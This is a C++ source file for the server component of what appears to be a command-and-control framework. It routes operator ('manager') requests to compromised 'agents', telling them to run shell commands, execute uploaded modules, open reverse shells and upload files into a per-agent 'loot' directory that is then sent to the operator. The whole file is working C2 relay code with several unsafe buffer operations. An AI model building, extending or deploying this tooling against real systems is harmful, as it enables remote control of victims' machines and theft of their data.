#include "connection.h"

extern Server *server;
/*constructor for the connection instance*/
ConnectionInstance::ConnectionInstance(){
    this->data = nullptr;
}

/*Neato destructor*/
ConnectionInstance::~ConnectionInstance(){
    return;
}

/*Handler for manager connections and flow*/
int ConnectionInstance::manager_handler() {
    int operation;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char buff[BUFSIZ];
            

    if(!this->api_check(this->transport->get_agent_name(this->data)))
    {
        free(resp);
        return 1;
    }

    this->agent_name = (char *)this->data;
    // main instruction loop
    while (!quitting)
    {
        // reset variables for loop
        ptr = resp;
        operation = -1;
        dat_ptr = NULL;
        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, 2048);
        memset(tmpbf, 0, sizeof(tmpbf));
        
        // get operation request
        if(!this->api_check(this->transport->read(this->data, &resp, 128))) break;
        printf("response: %s\n", resp);
        
        // parse it
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        this->log("Operation caught: %d\n", 
                (char *)this->data,
                operation);

        // main switch
        switch (operation)
        {
            // manager is exiting
        case MANAG_EXIT:
            quitting = 1;
            break;

            // Manager wants all of the loot
        case MANAG_GET_LOOT:
            if(!this->send_loot(ptr)) quitting = true;
            break;

            // Manager wants to give the agent a file
        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Caught wrong format identifier in input\n", 
                            this->agent_name);
                return 1;
            }

            // splits the options to find path to target file 
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count);
            
            // gets file from manager
            if(!this->download_file(d_ptr, 1, dat_ptr)) quitting = true;

            // tells the agent to download it 
            if(!AgentInformationHandler::task(AGENT_DOWN_FILE, 
                                            dat_ptr, d_ptr))                            
                quitting = true;
            break;

            // Manager wants agent to start a reverse shell
        case MANAG_REQ_RVSH:
            if(!AgentInformationHandler::task(AGENT_REV_SHELL, 
                                            dat_ptr, d_ptr))
                quitting = true;
            break;

            // Manager wants agent to run a binary module
            // This will be stored in the agent's `tasking` dir
        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->agent_name);
                return 1;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count);
            
            // gets file from Manager
            if(!this->download_file(d_ptr, 1, dat_ptr)) 
                quitting = true;
            
            // task agent
            if(!AgentInformationHandler::task(AGENT_EXEC_MODULE, 
                                            dat_ptr, d_ptr))                                  
                    quitting = true;
            break;

            // Manager wants to check if loot is available 
        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");

            /*
            UNIMPLEMENTED
            */

            break;

            // Manager wants agent to upload file to server
            // This adds the target file to the agent's `loot` dir
        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->agent_name);
                return 1;
            }

            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count);
            if(!AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr)) {
                // Tells server tasking was successfully assigned 
                if(!this->api_check(this->transport->send_ok(this->data)))
                    quitting = true;
            } else {
                // Tasking failed for some reason
                if(!this->api_check(this->transport->send_err(this->data)))
                    quitting = true;
            }
            
            break;

            // Manager wants agent to execute shell command
        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->agent_name);
                return 1;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count);
            
            if(!AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr)){
               // Tells server tasking was successfully assigned 
                if(!this->api_check(this->transport->send_ok(this->data)))
                    quitting = true;
                
            } else {
                // Tasking failed for some reason
                if(!this->api_check(this->transport->send_err(this->data)))
                    quitting = true;
            }
            break;

            // Manager wants to register a new agent
        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");

            AgentInformationHandler::register_agent(ptr);

            if(!this->api_check(this->transport->send_ok(this->data))){
                return 1;
            }

            break;

            // Manager wants an agent's information
        case MANAG_GET_INFO:
            if(this->send_info(ptr)) {
                printf("Failed get_info api check\n");
                quitting = true;}
            break;

            // Manager wants all active ports on the server 
            // This is so it can connect to open agent shells
        case MANAG_REQ_PORTS:
            if(this->get_ports(ptr)) quitting = true;
            break;

            // Manager wants to connect to available reverse shell
        case MANAG_CONN_RVSH:
            if(!this->api_check(this->transport->init_reverse_shell(this->data))) quitting = true;
            break;

            // Manager wants list of available transport backends
        case MANAG_GET_TRANSPORTS:
            this->send_transports();
            break;

            // Manager wants to start transport backend
        case MANAG_START_TRANSPORT:
            if(!this->setup_transport(ptr)){
                if(!this->api_check(this->transport->send_err(this->data)))
                    quitting = true;
            } else {
                if(!this->api_check(this->transport->send_ok(this->data)))
                    quitting = true;
            }
            
            break;

            // Unknown operation
        default:
            this->log("Unknown operation value '%d'\n", this->agent_name, operation);
            if(!this->api_check(this->transport->send_err(this->data))) quitting = true;
            break;
        }
    }

    // free and exit
    printf("Thread exiting...\n");
    
    free(resp);
    if(!this->api_check(this->transport->end(this->data))) return 1;
    
    return 0;
}

/*Sends agent information to manager*/
int ConnectionInstance::send_info(char *ptr){
    int size = 0;
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char *dat = NULL;
    char *tmpbf = (char*)malloc(3);

    DIR *dir;
    FILE *file;
    struct dirent *ent;

    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));

    // open the agent directory 
    if ((dir = opendir ("agents/")) != NULL) {
        // Loop over all agent working directories 
        while ((ent = readdir (dir)) != NULL) {
            // ignore current, parent, and agents.dat
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
                continue;
            } else {

                // open the corresponding agent's info.txt
                // and set up helper buffers 
                memset(buff, 0, sizeof(buff));
                memset(name, 0, sizeof(name));
                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
                getcwd(name, sizeof(name));
                strcat(name, buff);
                memset(buff, 0, sizeof(buff));
                file = fopen(name, "r");

                // check if file was opened successfully 
                if(file == NULL){
                    // if not, log it and continue to the next directory 
                    this->log("Could not get info on agent %s\n", this->agent_name, ent->d_name);
                    perror("");
                } else {

                    // get file size
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    //printf("Size: %d\n", size);

                    // Allocate file memory 
                    dat = (char *)malloc(size);
                    memset(dat, 0, size);
                    rewind(file);
                    fread(dat, 1, size, file);
                    //printf("File data: %s\n", dat);
                    
                    // Write the data to transport and free it
                    if(!this->api_check(this->transport->write(this->data, dat, size))) {
                        printf("Failed API check against transport->write (file data)\n");
                        return 1;
                    }
                    free(dat);

                    
                    // get response. this is here to keep send/read order 
                    // and avoid lockups due to both ends reading together
                    if(!this->api_check(this->transport->read(this->data, &tmpbf, 3))) {
                        printf("Failed API check against transport->read (response)\n");
                        return 1;
                    }
                    
                }
            }
        }

        // Tell the manager we are done
        if(!this->api_check(this->transport->write(this->data, "fi", 2))) return 1;
        
        // close directory 
        closedir (dir);
    } else {
        // could not open directory
        this->log("Failed to open directory\n", this->agent_name);
            
        perror ("");
        free(tmpbf);
        return 2;
    }
    return 0;
}

/* Downloads file from connected endpoint */
int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
    size_t size = 0;
    size_t size_e = 0;
    const char *data_ptr;
    unsigned char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    FILE *file;


    // Say we are ready for receiving data 
    if(!this->api_check(this->transport->send_ok(this->data))) return 1;


    // read the size of the file from target
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    if(!this->api_check(this->transport->read(this->data, 
                        (char**)&tmpbuffer, 
                        sizeof(tmpbuffer)))) return 1;
    
    // convert string to integer and allocate sufficient memory
    size = atoi(tmpbuffer);
    data_ptr = (const char *)malloc(size+1);
    memset((void*)data_ptr, 0, size+1);
            
    // ready for data 
    if(!this->api_check(this->transport->send_ok(this->data))) {
        free((void*)data_ptr);
        return 1;
    }

    // read data until we have read `size` bytes
    size_t tmpint = 0;
    while (tmpint < size)
    {
        if(!this->api_check(this->transport->read(this->data, 
                                        (char **)&data_ptr+strlen(data_ptr), 
                                        size-tmpint))) return 1;
        
        // add received bytes to total
        tmpint += (int)this->data;
    
    }
    
    // get decoded size of data and allocate memory for it
    size_e = B64::dec_size(data_ptr);
    enc_ptr = (unsigned char *)malloc(size_e);

    // try to decode data
    if(!B64::decode(data_ptr, enc_ptr, size_e)){
        
        // Failed
        this->log("Failed to decode data\n", this->agent_name);
        free((void*)data_ptr);
        free(enc_ptr);

        // tell endpoint we failed
        if(!this->api_check(this->transport->send_err(this->data))) return 1;
        
        return 1;
    }

    // free encoded data 
    free((void*)data_ptr);
            
    // say we got it successfully
    if(!this->api_check(this->transport->send_ok(this->data))) return 1;
    

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));

    // if its a manager, we write it to an agent's tasking dir
    // else we write it to the agent's loot dir
    if(is_manager){
        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
    } else {
        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), this->agent_name, ptr);
    }
    
    // open file
    file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }

    // write and close
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);

    // free decoded data and return
    free(enc_ptr);

    return 0;
}



/* Returns all available ports for accessing reverse shells */
int ConnectionInstance::get_ports(char *ptr){
    char *buff = (char*)malloc(1024);
    char *idx = buff;

    std::vector<ShellComms *> *session_vec = server->get_shell_sessions();

    // loops over all current sessions and filters out
    // the ones currently available to interact with
    for (ShellComms *sess : *(session_vec))
    {
        if(sess->check_state(AWAIT_STATE)){
            int sz = sprintf(idx, "%d,%s\n", sess->get_id(), sess->get_name());
            idx += sz;
        }
    }

    if(!this->api_check(this->transport->write(this->data, buff, idx-buff))){
        free(buff);
        idx = 0;
        return 1;
    }
    
    free(buff);
    idx = 0;

    return 0;
}

/* Sends information about available transport backends*/
int ConnectionInstance::send_transports(){
    printf("Sending transports\n");
    char *buff = (char*)malloc(2048);
    std::vector<ServerModule *> *mod_vec = server->get_modules();
    int i = 0;
    char *sz = (char*)malloc(128);
    
    // loop over each handle and send info to server
    for(ServerModule *module : *mod_vec){
        memset(buff, 0, 2048);
        memset(sz, 0, 128);

        // formats id and transport name into desired format
        sprintf(buff, "%s:%d", module->get_name(), module->get_id());

        // gets data size
        sprintf(sz, "%ld", strlen(buff));

        printf("Size: %s, String: %s\n", sz, buff);

        // write size
        if(!this->api_check(this->transport->write(this->data, sz, 5))) 
            return 1;
        memset(sz, 0, 5);
        if(!this->api_check(this->transport->read(this->data, &sz, 3)))
            return 1;

        // write data
        if(!this->api_check(this->transport->write(this->data, 
                            buff, strlen(buff)))) return 1;
        
        
        if(!this->api_check(this->transport->read(this->data, &buff, 3))) 
            return 1;
        i++;
    }

    // free size
    free(sz);
    
    // tell manager we are done
    if(!this->api_check(this->transport->write(this->data, "fi", 2))) return 1;
    
    if(!this->api_check(this->transport->read(this->data, &buff, 3))) return 1;
        
    
    return 0;
}

/* Initiates the connection between a manager and connected agent*/
int ConnectionInstance::reverse_shell(){
    printf("Waiting for shell handling...\n");

    int target_id = -1;

    // gets the appropriate shell session from the server
    std::vector<ShellComms *> *sessions = server->get_shell_sessions();
    ShellComms *session = NULL;
    for(ShellComms *s : *(sessions)){
        if(s->get_id() == target_id){
            session = s;
            break;
        }
    } 
    
    if(session == NULL) {
        this->log("Failed to find target session id", this->agent_name);
        return 1;
    }

    // attepts to "initialize" a session
    session->start_session();

    // hand off to handlers
    if(this->type == MANAG_TYPE) {
        this->manager_shell_session(session);
    } else {
        this->agent_shell_session(session);
    }

    while(this->shell_finished) sleep(1);

    return 1;
}

/* handles shell sessions for a manager */
int ConnectionInstance::manager_shell_session(ShellComms *session){
    void *dat = malloc(4096);
    int b64_enc_sz = B64::enc_size(4096);
    char *send_buff = (char*) malloc(b64_enc_sz);
    // give time to update for other thread
    sleep(0.1);

    

    // here starts the main loop
    while(1){
        if(session->check_state(MANAGE_STATE)){
            session->wait_read(&dat, 4096, MANAGE_STATE);
            B64::encode((const unsigned char *)dat, 4096, &send_buff);
            if(!this->api_check(this->transport->write(this->data, send_buff, b64_enc_sz))){
                free(dat);
                free(send_buff);
                return 1;
            }
        
        } else if(session->check_state(ACTIVE_STATE)){
            memset(dat, 0, 4096);
            //  read data from the client
            if(!this->api_check(this->transport->read(this->data, (char**)&dat, 4096))){
                free(dat);
                free(send_buff);
                return 1;
            }

            // write it to session
            session->wait_write(dat, 4096, AGENT_STATE);
        }       
        
    }
}

/* handles shell sessions for agents*/
int ConnectionInstance::agent_shell_session(ShellComms *session){
    void *dat = malloc(4096);
    int b64_enc_sz = B64::enc_size(4096);
    char *send_buff = (char*) malloc(b64_enc_sz);
    
    // here starts the main loop
    while(1){
        if(session->check_state(AGENT_STATE)){
            session->wait_read(&dat, 4096, AGENT_STATE);
            B64::encode((const unsigned char *)dat, 4096, &send_buff);
            if(!this->api_check(this->transport->write(this->data, send_buff, b64_enc_sz))){
                free(dat);
                free(send_buff);
                return 1;
            }
        
        } else if(session->check_state(ACTIVE_STATE)){
            memset(dat, 0, 4096);
            //  read data from the client
            if(!this->api_check(this->transport->read(this->data, (char**)&dat, 4096))){
                free(dat);
                free(send_buff);
                return 1;
            }

            // write it to session
            session->wait_write(dat, 4096, MANAGE_STATE);
        }       
        
    }
}


/*Handler for agent connections and flow*/
int ConnectionInstance::agent_handler(){    
    // initialize variables
    int operation = 0;
    int quitting = 0;
    char *ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char buff[2048];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char logbuff[BUFSIZ];
    
    if(!this->api_check(this->transport->get_agent_name(this->data)))
    {
        free(resp);
        return 1;
    }

    this->agent_name = (char *)this->data;

    // enters main handler loop
    while (!quitting)
    {
        // reset buffers and variables on repeat
        ptr = resp;
        operation = -1;
        memset((void*)buff, 0, sizeof(buff));
        memset((void*)tmpbuffer, 0, sizeof(tmpbuffer));
        memset((void*)filename, 0, sizeof(filename));
        memset((void*)resp, 0, 2048);
        memset((void*)logbuff, 0, sizeof(logbuff));
        
        // gets the agent's requested tasking operation
        if(!this->api_check(this->transport->read(this->data, &resp, 2048))) 
            return 1;
        
        // parses operation into buffers
        //printf("Requested tasking: %s\n", resp);
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        this->log("Operation caught: %d\n", this->agent_name, operation);

        // main decision switch
        switch (operation)
        {
            // Agent wants to exit
        case AGENT_EXIT:
            this->log("Client exiting...\n", this->agent_name); 
            quitting = 1;
            break;

            // Agent wants to download tasked file
        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", this->agent_name, ptr);
            if(!this->api_check(this->transport->upload_file(this->data, buff, 0)))
                return 1;
            break;

            // Agent wants to upload a loot file
        case AGENT_UP_FILE:
            this->download_file(ptr, 0, NULL);
            break;

            // Agent wants to initialize a reverse shell
        case AGENT_REV_SHELL:
            this->log("Agent reverse shell caught\n", this->agent_name);
            //this->server->get_shell_queue()->push(this);
            //this->reverse_shell();
            break;

            // Agent wants to download and execute a module
        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", this->agent_name, ptr);
            if(!this->api_check(this->transport->upload_file(this->data, buff, 1)))
                return 1;
            break;

            // unknown operation request
        default:
            this->log("Unknown Operation Identifier: '%d'\n", this->agent_name, operation);
            if(!this->api_check(this->transport->send_err(this->data))) 
                return 1;
            quitting = 1;
            break;
        }
    }
    free(resp);

    return 0;
}

/* Let instance know that the reverse shell is done*/
void ConnectionInstance::shell_finish(){
    this->shell_finished = 1;
}

/* Initialized the connection and prepares data structures for handlers */
int ConnectionInstance::handle_connection(){
    // reload the logger because of threads not sharing stacks
    this->transport->listen(this->data);
    

    // creates classes and instances
    if(!this->api_check(this->transport->determine_handler(this->data))) 
        return 1;
    this->type = (int) this->api_data;

    // determines handler to use
    if (this->type == AGENT_TYPE) {
        printf("Starting agent handler\n");
        this->agent_handler();
    } else if(this->type == MANAG_TYPE) {
        printf("Starting manager handler\n");
        this->manager_handler();
    } else {
        // failed to handle the parsing :)
        this->log("Got Unknown Handler Type: %d\n", "GENERIC", this->type);
        return 1;
    }
    return 0;
}

/* Starts a new transport on the server */
int ConnectionInstance::setup_transport(char *inf){
    printf("Setting up transports\n");
    

    // Gets the target transport ID and listening port
    //char *port_num = inf;
    char *id_str = strtok(inf, ":");
    char *port_str = strtok(NULL, ":");

    // convert strings to ints
    int id = atoi(id_str);
    int port = atoi(port_str);
    
    server->listen_instance(server->get_module_from_id(id),port);
    return 0;
}

/* Sends loot to the manager */
int ConnectionInstance::send_loot(char *ptr){
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbf[3];
    int count;
    int ctr = 0;
    int size;
    int size_e;
    char *tmp_ptr2;
    DIR *dir;
    FILE *file;
    struct dirent *ent;
    
    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    
    this->log("Sending loot\n", this->agent_name);
    

    // open the target loot directory
    count = 0;
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), this->agent_name);
    
    // Count the number of files in the dir
    if((dir = opendir(buff)) != NULL){
        while((ent =readdir(dir)) != NULL){
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                count++;
            }
        }

        memset(name, 0, sizeof(name));
        sprintf(name, "%d", count);

        // write count to transport     
        if(!this->api_check(this->transport->write(this->data, name, 
                            strlen(name)))) return 1;
        
        if(!this->api_check(this->transport->read(this->data, (char**)&tmpbf, 
                            3))) return 1;//rd
        

        // If there is nothing to, return
        if(count == 0) return 0;

        /*
        Note: See if we can rework this so it 
              doesnt need to loop through the 
              directory twice
        */

        // Loops again and sends files to server
        while ((ent = readdir (dir)) != NULL) {

            // filters out current and parent dir entries
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {

                // get the file name and open it 
                memset(buff, 0, sizeof(buff));
                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), this->agent_name, ent->d_name);
                
                
                file = fopen(buff, "r");
                if(!file){
                    this->log("Failed to open loot file", this->agent_name);
                    perror("");
                    if(!this->api_check(this->transport->send_err(this->data)))
                        return 1;
                    return 1;
                }
                
                // writes the file name to transport 
                if(!this->api_check(this->transport->write(this->data, 
                                        ent->d_name, strlen(ent->d_name)))
                    ) return 1;

                if(!this->api_check(this->transport->read(this->data, 
                                            (char**)&tmpbf, 3))
                    ) return 1;
                
                
                ctr++;
                memset(buff, 0, sizeof(buff));
                
                
                /*
                Note: See if we can replace this with a raw 
                transport->send_file or equiv so we reuse code
                */
                
                // get both the file size and encoded size
                fseek(file, 0L, SEEK_END);
                size = ftell(file);
                size_e = B64::enc_size(size);
                rewind(file);


                // read data into temp buffer
                char tmp_ptr[size];
                memset(tmp_ptr, 0, size);
                fread(tmp_ptr, 1, size, file);
                fclose(file);
                
                // encode data 
                B64::encode((unsigned char*)tmp_ptr, size, &tmp_ptr2);
                
                memset(buff, 0, 256);
                sprintf(buff, "%d", size_e);
                
                // write encoded size to transport 
                if(!this->api_check(this->transport->write(this->data, buff, 
                                        strlen(buff)))
                    ) return 1;
                

                if(!this->api_check(this->transport->read(this->data, 
                                    (char**)&tmpbf, 3))
                    ) return 1;//ok
                

                // write encoded data to transport 
                if(!this->api_check(this->transport->write(this->data, 
                                    tmp_ptr2, strlen(tmp_ptr2)))
                    ) return 1;
                

                // free data
                free(tmp_ptr2);

                // check if we have sent all of the files
                if (ctr >= count)
                {
                    printf("Finished writing loot to channel\n");
                    
                    // tell endpoint we are done here
                    if(!this->api_check(this->transport->write(this->data, 
                                        "fi", 3))
                        ) return 1;

                    break;
                }                             
                
                // tell endpoint we have more
                if(!this->api_check(this->transport->write(this->data, 
                                    "nx", 3))
                    ) return 1;
                
                if(!this->api_check(this->transport->read(this->data, 
                                    (char**)&tmpbf, 3))
                    ) return 1; //rd
            }
        }
    
    } else {
        /* could not open directory */
        perror ("");
        return 2;
    }

    // close directory handle
    closedir(dir);

    return 0;
}



/*Sets the transport for the connection instance*/
void ConnectionInstance::set_transport(ptransport_t transport){
    this->transport = transport;
}

/* Returns the transport structure associated with this instance*/
ptransport_t ConnectionInstance::get_transport(){
    return this->transport;
}

/* Returns the transport data associated with this instance*/
void *ConnectionInstance::get_data(){
    return this->data;
}

/* Sets the current thread associated with this instance 
This is mostly for making sure theads dont go out of scope
and accidentally cleaned up during runtime*/
void ConnectionInstance::set_thread(pthread_t thread){
    this->thread = thread;
}

/* Sets the transport data associated with this instance*/
void ConnectionInstance::set_data(void *data){
    this->data = data;
}

/* Sets the server reference */
void ConnectionInstance::set_server(class Server *server){
    this->server = server;
}
